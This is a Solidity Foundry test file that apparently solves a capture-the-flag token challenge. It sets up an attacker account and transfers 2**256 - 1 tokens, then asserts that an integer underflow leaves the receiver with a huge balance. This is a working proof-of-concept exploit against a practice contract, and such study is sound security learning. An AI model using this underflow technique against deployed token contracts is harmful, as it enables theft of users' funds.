// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/5-Token.sol";

contract TokenTest is Test {
    Token public tokenCTF;
    address attacker = address(0x01);
    address receiver = address(0x02);

    function setUp() public {
        tokenCTF = new Token(100);

        vm.startPrank(attacker);
        vm.deal(attacker, 100 ether);
        vm.label(attacker, "attacker");
        vm.label(receiver, "receiver");
    }

    function testAttack() public {
        tokenCTF.transfer(receiver, 2 ** 256 - 1);

        assertEq(tokenCTF.balanceOf(attacker), 1);
        assertEq(tokenCTF.balanceOf(receiver), 2 ** 256 - 1);
    }
}
